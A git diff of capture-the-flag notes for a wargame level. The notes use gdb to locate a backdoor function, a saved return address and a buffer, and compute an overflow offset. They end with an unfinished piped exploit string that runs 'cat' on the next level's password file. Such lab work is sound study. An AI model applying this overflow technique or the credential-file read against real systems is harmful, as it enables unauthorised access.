@@ -13,45 +13,49 @@ level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), d
 ### step 2: Code Analysis
 
 - find secret backdoor function address : `0x000055555555488c`
-- find eip of set_username : `0x7fffffffe4f8`  and set_msg : `0x7fffffffe4f8`
+```
+gdb level09
+info functions
+```
+- find eip of handle_msg : `0x7fffffffe5c8`
  
 ```
 gdb level09
-b set_username
-c
-info frame
-(gdb) info frame
-Stack level 0, frame at 0x7fffffffe500:
- rip = 0x5555555549d1 in set_username; saved rip 0x555555554915
- called by frame at 0x7fffffffe5d0
- Arglist at 0x7fffffffe4f0, args: 
- Locals at 0x7fffffffe4f0, Previous frame's sp is 0x7fffffffe500
- Saved registers:
-  rbp at 0x7fffffffe4f0, rip at 0x7fffffffe4f8
-```
+b handle_msg
+ r
+Starting program: /home/users/level09/level09 
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
 
-```
-Breakpoint 4, 0x0000555555554936 in set_msg ()
+Breakpoint 1, 0x00005555555548c4 in handle_msg ()
 (gdb) info frame
-Stack level 0, frame at 0x7fffffffe500:
- rip = 0x555555554936 in set_msg; saved rip 0x555555554924
- called by frame at 0x7fffffffe5d0
- Arglist at 0x7fffffffe4f0, args: 
- Locals at 0x7fffffffe4f0, Previous frame's sp is 0x7fffffffe500
+Stack level 0, frame at 0x7fffffffe5d0:
+ rip = 0x5555555548c4 in handle_msg; saved rip 0x555555554abd
+ called by frame at 0x7fffffffe5e0
+ Arglist at 0x7fffffffe5c0, args: 
+ Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
  Saved registers:
-  rbp at 0x7fffffffe4f0, rip at 0x7fffffffe4f8
+  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
 ```
-
 
 - find address of ref : 
+
+Set breakpoint before the call of set_msg or set_username in handle_msg because the ref is passed as an argument to these functions so we can find the address in rax
+
 ```
-(gdb) x $rdi
-0x7fffffffe500:	0x0000000a
+gdb level09
+start
+disas handle_msg
+b *0x0000555555554910
+c
 (gdb) x $rax
 0x7fffffffe500:	0x0000000a
 ```
 
 - find offset between ref and eip address
+`0x7fffffffe5c8 - 0x7fffffffe500 = 200`
 
 set_username
 ecrit de ref + 140 à ref + 181
@@ -60,3 +64,7 @@ ecrit de ref à ref + 180 ?
 dépasse sur message au 128 eme char dans username
 final string : 
 (python -c 'print("hhshs")' ; python -c 'print("hhshs")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
+
+
+0x7fffffffe500
+0x7fffffffe5c8
